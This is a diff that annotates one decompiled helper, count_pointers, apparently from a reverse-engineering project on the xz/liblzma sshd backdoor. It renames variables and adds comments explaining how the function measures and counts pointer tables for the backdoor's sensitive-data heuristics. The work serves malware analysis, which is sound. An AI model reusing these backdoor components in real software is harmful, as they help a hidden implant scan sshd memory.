@@ -5,8 +5,10 @@
 
 
 /*
- * AutoDoc: Uses `malloc_usable_size()` to measure a pointer array and counts consecutive non-NULL entries until it hits either a NULL or
- * the allocation boundary. Sensitive-data heuristics call it when walking sshd tables whose length isn’t stored explicitly.
+ * AutoDoc: Counts consecutive non-NULL entries inside an sshd pointer table. It first confirms the caller handed in both the array and a
+ * `malloc_usable_size()` hook, queries the allocator for the actual buffer size, and only trusts tables smaller than ~0x80 bytes to
+ * avoid chasing attacker-sized allocations. The loop stops at the first NULL or the allocation boundary, then reports how many slots
+ * were populated so the sensitive-data heuristics can reason about argv/envp-style arrays.
  */
 
 #include "xzre_types.h"
@@ -14,30 +16,35 @@
 BOOL count_pointers(void **ptrs,u64 *count_out,libc_imports_t *funcs)
 
 {
-  BOOL BVar1;
-  size_t block_size;
-  ulong index;
-  ulong count;
+  BOOL success;
+  size_t allocation_size;
+  ulong probe_index;
+  ulong live_count;
   
+  // AutoDoc: Refuse to run without both the pointer list and libc’s `malloc_usable_size()`; this helper never guesses lengths.
   if (((ptrs == (void **)0x0) || (funcs == (libc_imports_t *)0x0)) ||
      (funcs->malloc_usable_size == (pfn_malloc_usable_size_t)0x0)) {
     return FALSE;
   }
-  block_size = (*funcs->malloc_usable_size)(ptrs);
-  if (block_size - 8 < 0x80) {
-    index = 0;
+  // AutoDoc: Measure the actual chunk so the scan can stop exactly at the allocator boundary.
+  allocation_size = (*funcs->malloc_usable_size)(ptrs);
+  // AutoDoc: Only trust reasonably small pointer tables (<=0x87 bytes) to avoid spending time on obviously bogus chunks.
+  if (allocation_size - 8 < 0x80) {
+    probe_index = 0;
     do {
-      count = index;
-      if (ptrs[index] == (void *)0x0) break;
-      index = (ulong)((int)index + 1);
-      count = block_size >> 3;
-    } while (index < block_size >> 3);
-    *count_out = count;
-    BVar1 = TRUE;
+      live_count = probe_index;
+      // AutoDoc: Stop counting as soon as we see a NULL terminator; argv/envp arrays always use that sentinel.
+      if (ptrs[probe_index] == (void *)0x0) break;
+      probe_index = (ulong)((int)probe_index + 1);
+      // AutoDoc: If we hit the allocation boundary without seeing NULL, treat the whole buffer as populated.
+      live_count = allocation_size >> 3;
+    } while (probe_index < allocation_size >> 3);
+    *count_out = live_count;
+    success = TRUE;
   }
   else {
-    BVar1 = FALSE;
+    success = FALSE;
   }
-  return BVar1;
+  return success;
 }
 
